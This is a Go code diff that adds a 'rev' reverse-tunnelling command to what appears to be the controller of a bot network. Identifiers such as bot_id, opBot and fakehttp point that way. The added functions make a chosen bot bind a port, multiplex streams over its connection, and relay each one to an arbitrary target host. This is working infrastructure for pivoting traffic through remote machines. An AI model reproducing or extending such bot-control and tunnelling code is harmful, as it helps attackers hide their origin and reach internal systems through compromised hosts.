@@ -14,11 +14,13 @@ import (
 	"sync"
 	"encoding/json"
 	"bytes"
+	"time"
 
 	"io/ioutil"
 	"encoding/base64"
 
 	"lib/fakehttp"
+	"lib/smux"
 	kit "local/toolkit"
 	"local/base"
 	vlog "local/log"
@@ -270,6 +272,7 @@ var opFunc = map[string](func([]string) (bool, bool, string)){
 	"quit": opBye,
 	"ls": opBot,
 	"local": opLocal,
+	"rev": opReverse,
 }
 
 func opBye(args []string) (bool, bool, string) {
@@ -451,6 +454,88 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		raw2fast(p0, p1, argv[1])
 
 	default:
+	}
+}
+
+func opReverse(args []string) (exit bool, hasout bool, out string) {
+	exit , hasout , out  = false, false, `
+rev $bot_id $bot_bind_addr $target
+rev stop $rev_id (TODO)
+`
+	if len(args) < 3 {
+		hasout = true
+		return
+	}
+	id := args[0]
+	addr := args[1]
+	target := args[2]
+
+	// TODO: stop by command
+	handleFn := func() {
+		p1, err := admin.GetConn2Client(id, base.B_bind)
+		if err != nil {
+			vlog.Vln(2, "[rev]init err", err)
+			return
+		}
+		defer p1.Close()
+
+		handleReverse(p1, addr, target)
+	}
+
+	go handleFn()
+
+	return false, true, "ok...\n"
+}
+
+func handleReverse(p1 net.Conn, addr string, target string) {
+	handleFn := func(p1 net.Conn) {
+		defer p1.Close()
+
+		p2, err := net.DialTimeout("tcp", target, 10*time.Second)
+		if err != nil {
+			vlog.Vln(3, "[rev][err]target", target, err)
+			return
+		}
+		defer p2.Close()
+
+		vlog.Vln(3, "[rev][got]", target)
+		kit.Cp(p1, p2)
+	}
+
+	kit.WriteTagStr(p1, addr)
+
+	ret64, err := kit.ReadVLen(p1)
+	if err != nil {
+		vlog.Vln(3, "[rev]bind err0", err)
+		return
+	}
+	if int(ret64) != 0 {
+		vlog.Vln(3, "[rev]bind err", ret64)
+		return
+	}
+
+	bindAddr, err := kit.ReadTagStr(p1)
+	if err != nil {
+		vlog.Vln(3, "[rev]Error get binding addr:", err)
+		return
+	}
+	vlog.Vln(1, "[rev]bind on:", bindAddr)
+
+	// stream multiplex
+	smuxConfig := smux.DefaultConfig()
+	mux, err := smux.Server(p1, smuxConfig)
+	if err != nil {
+		vlog.Vln(3, "[rev]mux init err", err)
+		return
+	}
+	for {
+		conn, err := mux.AcceptStream()
+		if err != nil {
+			mux.Close()
+			break
+		}
+
+		go handleFn(conn)
 	}
 }
 
